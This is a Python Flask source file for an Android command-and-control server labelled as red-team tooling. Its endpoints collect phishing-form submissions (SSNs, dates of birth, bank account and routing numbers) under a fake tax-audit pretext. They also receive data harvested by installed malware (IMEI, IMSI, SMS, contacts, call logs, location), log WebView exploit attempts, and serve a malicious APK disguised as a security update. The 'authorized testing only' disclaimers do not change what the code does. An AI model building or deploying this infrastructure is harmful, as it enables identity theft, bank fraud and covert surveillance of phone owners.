#!/usr/bin/env python3
"""
C2 Server API Endpoints for Android Red Team Testing
Handles data collection from phishing forms and APK malware
"""

from flask import Flask, request, jsonify, render_template_string
import json
import os
from datetime import datetime
import sqlite3
import hashlib

app = Flask(__name__)

# Database setup
def init_database():
    """Initialize SQLite database for data collection"""
    conn = sqlite3.connect('redteam_data.db')
    cursor = conn.cursor()
    
    # Form submissions table
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS form_submissions (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            timestamp TEXT,
            ip_address TEXT,
            user_agent TEXT,
            ssn TEXT,
            dob TEXT,
            account_number TEXT,
            routing_number TEXT,
            email TEXT,
            contact_number TEXT,
            audit_case TEXT,
            amount_owed TEXT,
            source TEXT,
            device_type TEXT
        )
    ''')
    
    # Device fingerprints table
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS device_fingerprints (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            timestamp TEXT,
            ip_address TEXT,
            user_agent TEXT,
            platform TEXT,
            language TEXT,
            screen_width INTEGER,
            screen_height INTEGER,
            android_version TEXT,
            chrome_version TEXT,
            is_webview BOOLEAN,
            location_lat REAL,
            location_lng REAL,
            fingerprint_hash TEXT
        )
    ''')
    
    # APK data collection table
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS apk_data (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            timestamp TEXT,
            device_id TEXT,
            imei TEXT,
            imsi TEXT,
            phone_number TEXT,
            android_id TEXT,
            device_model TEXT,
            manufacturer TEXT,
            android_version TEXT,
            location_lat REAL,
            location_lng REAL,
            network_operator TEXT,
            sms_data TEXT,
            contacts_data TEXT,
            call_logs_data TEXT
        )
    ''')
    
    # Exploit attempts table
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS exploit_attempts (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            timestamp TEXT,
            ip_address TEXT,
            user_agent TEXT,
            exploit_type TEXT,
            description TEXT,
            success BOOLEAN,
            data TEXT
        )
    ''')
    
    conn.commit()
    conn.close()

@app.route('/api/audit-collect', methods=['POST'])
def collect_audit_data():
    """Collect data from audit phishing form"""
    try:
        data = request.json
        timestamp = datetime.now().isoformat()
        ip_address = request.remote_addr
        user_agent = request.headers.get('User-Agent', '')
        
        # Store in database
        conn = sqlite3.connect('redteam_data.db')
        cursor = conn.cursor()
        
        cursor.execute('''
            INSERT INTO form_submissions 
            (timestamp, ip_address, user_agent, ssn, dob, account_number, 
             routing_number, email, contact_number, audit_case, amount_owed, 
             source, device_type)
            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
        ''', (
            timestamp, ip_address, user_agent,
            data.get('ssn'), data.get('dob'), data.get('account_number'),
            data.get('routing_number'), data.get('email'), data.get('contact_number'),
            data.get('audit_case'), data.get('amount_owed'),
            data.get('source'), data.get('device_type')
        ))
        
        conn.commit()
        conn.close()
        
        # Log to console
        print(f"üìã Form submission received from {ip_address}")
        print(f"   Device: {data.get('device_type', 'Unknown')}")
        print(f"   Case: {data.get('audit_case', 'N/A')}")
        
        return jsonify({'status': 'success', 'message': 'Data collected'})
        
    except Exception as e:
        print(f"‚ùå Error collecting form data: {str(e)}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/api/android-device-info', methods=['POST'])
def collect_device_info():
    """Collect Android device fingerprint data"""
    try:
        data = request.json
        timestamp = datetime.now().isoformat()
        ip_address = request.remote_addr
        user_agent = request.headers.get('User-Agent', '')
        
        # Create fingerprint hash
        fingerprint_data = f"{data.get('userAgent', '')}{data.get('screenWidth', '')}{data.get('androidVersion', '')}"
        fingerprint_hash = hashlib.md5(fingerprint_data.encode()).hexdigest()
        
        # Store in database
        conn = sqlite3.connect('redteam_data.db')
        cursor = conn.cursor()
        
        location = data.get('location', {})
        
        cursor.execute('''
            INSERT INTO device_fingerprints 
            (timestamp, ip_address, user_agent, platform, language,
             screen_width, screen_height, android_version, chrome_version,
             is_webview, location_lat, location_lng, fingerprint_hash)
            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
        ''', (
            timestamp, ip_address, user_agent,
            data.get('platform'), data.get('language'),
            data.get('screenWidth'), data.get('screenHeight'),
            data.get('androidVersion'), data.get('chromeVersion'),
            data.get('isWebView', False),
            location.get('latitude'), location.get('longitude'),
            fingerprint_hash
        ))
        
        conn.commit()
        conn.close()
        
        # Log to console
        print(f"üì± Device fingerprint from {ip_address}")
        print(f"   Android: {data.get('androidVersion', 'Unknown')}")
        print(f"   Model: {data.get('userAgent', 'Unknown')[:50]}...")
        
        return jsonify({'status': 'success', 'fingerprint': fingerprint_hash})
        
    except Exception as e:
        print(f"‚ùå Error collecting device info: {str(e)}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/api/android-data', methods=['POST'])
def collect_apk_data():
    """Collect data from installed APK malware"""
    try:
        data = request.json
        timestamp = datetime.now().isoformat()
        
        # Store in database
        conn = sqlite3.connect('redteam_data.db')
        cursor = conn.cursor()
        
        device_identifiers = data.get('device_identifiers', {})
        location = data.get('location', {})
        device_info = data.get('device_info', {})
        network_info = data.get('network_info', {})
        harvested_data = data.get('harvested_data', {})
        
        cursor.execute('''
            INSERT INTO apk_data 
            (timestamp, device_id, imei, imsi, phone_number, android_id,
             device_model, manufacturer, android_version, location_lat, location_lng,
             network_operator, sms_data, contacts_data, call_logs_data)
            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
        ''', (
            timestamp,
            device_identifiers.get('android_id'),
            device_identifiers.get('imei'),
            device_identifiers.get('imsi'),
            device_identifiers.get('phone_number'),
            device_identifiers.get('android_id'),
            device_info.get('model'),
            device_info.get('manufacturer'),
            device_info.get('android_version'),
            location.get('latitude'),
            location.get('longitude'),
            network_info.get('operator'),
            json.dumps(harvested_data.get('sms_messages', [])),
            json.dumps(harvested_data.get('contacts', [])),
            json.dumps(harvested_data.get('call_logs', []))
        ))
        
        conn.commit()
        conn.close()
        
        # Log to console
        print(f"üì¶ APK data received")
        print(f"   Device: {device_info.get('model', 'Unknown')}")
        print(f"   IMEI: {device_identifiers.get('imei', 'N/A')}")
        print(f"   SMS Count: {len(harvested_data.get('sms_messages', []))}")
        print(f"   Contacts: {len(harvested_data.get('contacts', []))}")
        
        return jsonify({'status': 'success', 'message': 'APK data collected'})
        
    except Exception as e:
        print(f"‚ùå Error collecting APK data: {str(e)}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/api/exploit-attempts', methods=['POST'])
def log_exploit_attempts():
    """Log WebView exploit attempts"""
    try:
        data = request.json
        timestamp = datetime.now().isoformat()
        ip_address = request.remote_addr
        user_agent = request.headers.get('User-Agent', '')
        
        # Store in database
        conn = sqlite3.connect('redteam_data.db')
        cursor = conn.cursor()
        
        cursor.execute('''
            INSERT INTO exploit_attempts 
            (timestamp, ip_address, user_agent, exploit_type, description, success, data)
            VALUES (?, ?, ?, ?, ?, ?, ?)
        ''', (
            timestamp, ip_address, user_agent,
            data.get('type'), data.get('description'),
            data.get('success', False), json.dumps(data.get('data'))
        ))
        
        conn.commit()
        conn.close()
        
        # Log to console
        print(f"üîß Exploit attempt: {data.get('type', 'Unknown')}")
        print(f"   From: {ip_address}")
        print(f"   Description: {data.get('description', 'N/A')}")
        
        return jsonify({'status': 'success'})
        
    except Exception as e:
        print(f"‚ùå Error logging exploit: {str(e)}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/android-security-update.apk')
def serve_apk():
    """Serve the malicious APK file"""
    try:
        # In production, serve actual APK file
        apk_path = 'android-security-update.apk'
        if os.path.exists(apk_path):
            print(f"üì¶ APK download requested from {request.remote_addr}")
            return send_file(apk_path, as_attachment=True)
        else:
            print(f"‚ö†Ô∏è  APK file not found: {apk_path}")
            return "APK file not found", 404
    except Exception as e:
        print(f"‚ùå Error serving APK: {str(e)}")
        return "Server error", 500

@app.route('/dashboard')
def dashboard():
    """Simple dashboard to view collected data"""
    try:
        conn = sqlite3.connect('redteam_data.db')
        cursor = conn.cursor()
        
        # Get statistics
        cursor.execute('SELECT COUNT(*) FROM form_submissions')
        form_count = cursor.fetchone()[0]
        
        cursor.execute('SELECT COUNT(*) FROM device_fingerprints')
        fingerprint_count = cursor.fetchone()[0]
        
        cursor.execute('SELECT COUNT(*) FROM apk_data')
        apk_count = cursor.fetchone()[0]
        
        cursor.execute('SELECT COUNT(*) FROM exploit_attempts')
        exploit_count = cursor.fetchone()[0]
        
        # Get recent submissions
        cursor.execute('SELECT * FROM form_submissions ORDER BY timestamp DESC LIMIT 10')
        recent_forms = cursor.fetchall()
        
        conn.close()
        
        dashboard_html = f"""
        <!DOCTYPE html>
        <html>
        <head>
            <title>Red Team Dashboard</title>
            <style>
                body {{ font-family: Arial, sans-serif; margin: 20px; }}
                .stat {{ background: #f0f0f0; padding: 10px; margin: 10px 0; border-radius: 5px; }}
                table {{ border-collapse: collapse; width: 100%; }}
                th, td {{ border: 1px solid #ddd; padding: 8px; text-align: left; }}
                th {{ background-color: #f2f2f2; }}
            </style>
        </head>
        <body>
            <h1>üéØ Red Team Dashboard</h1>
            
            <h2>üìä Statistics</h2>
            <div class="stat">üìã Form Submissions: {form_count}</div>
            <div class="stat">üì± Device Fingerprints: {fingerprint_count}</div>
            <div class="stat">üì¶ APK Installations: {apk_count}</div>
            <div class="stat">üîß Exploit Attempts: {exploit_count}</div>
            
            <h2>üìù Recent Form Submissions</h2>
            <table>
                <tr>
                    <th>Timestamp</th>
                    <th>IP Address</th>
                    <th>Device Type</th>
                    <th>Case Number</th>
                    <th>Email</th>
                </tr>
        """
        
        for row in recent_forms:
            dashboard_html += f"""
                <tr>
                    <td>{row[1]}</td>
                    <td>{row[2]}</td>
                    <td>{row[13]}</td>
                    <td>{row[10]}</td>
                    <td>{row[8]}</td>
                </tr>
            """
        
        dashboard_html += """
            </table>
            
            <p><em>‚ö†Ô∏è This dashboard is for authorized red team testing only</em></p>
        </body>
        </html>
        """
        
        return dashboard_html
        
    except Exception as e:
        return f"Dashboard error: {str(e)}", 500

@app.route('/health')
def health_check():
    """Health check endpoint"""
    return jsonify({
        'status': 'healthy',
        'timestamp': datetime.now().isoformat(),
        'service': 'Android Red Team C2'
    })

if __name__ == '__main__':
    print("üöÄ Starting Android Red Team C2 Server")
    print("‚ö†Ô∏è  FOR AUTHORIZED PENETRATION TESTING ONLY")
    print("-" * 50)
    
    # Initialize database
    init_database()
    print("‚úÖ Database initialized")
    
    # Start server
    app.run(host='0.0.0.0', port=5000, debug=True)